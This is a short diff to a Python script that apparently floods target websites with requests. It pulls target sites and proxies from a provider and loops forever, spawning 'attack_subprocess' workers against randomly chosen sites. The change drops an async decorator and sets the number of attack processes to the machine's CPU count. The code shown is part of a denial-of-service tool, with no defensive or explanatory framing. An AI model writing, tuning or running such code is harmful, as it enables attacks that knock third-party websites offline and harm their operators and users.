@@ -1,7 +1,7 @@
 import asyncio
+import os
 
 import requests.exceptions
-from aioify import aioify
 from sys import stderr
 from concurrent.futures import ProcessPoolExecutor
 from random import choice
@@ -54,7 +54,6 @@ def set_logger_format():
     )
 
 
-@aioify
 def fetch_url(scraper, site, proxies):
     try:
         attack_response = scraper.get(site, timeout=settings.READ_TIMEOUT)
@@ -100,6 +99,6 @@ if __name__ == '__main__':
     sites = provider.get_target_sites()
     proxies = provider.get_proxies()
     while True:
-        with ProcessPoolExecutor(max_workers=settings.DEFAULT_THREADS) as executor:
+        with ProcessPoolExecutor() as executor:
             processes = [executor.submit(attack_subprocess, choice(sites), proxies)
-                         for _ in range(settings.DEFAULT_THREADS)]
+                         for _ in range(os.cpu_count())]
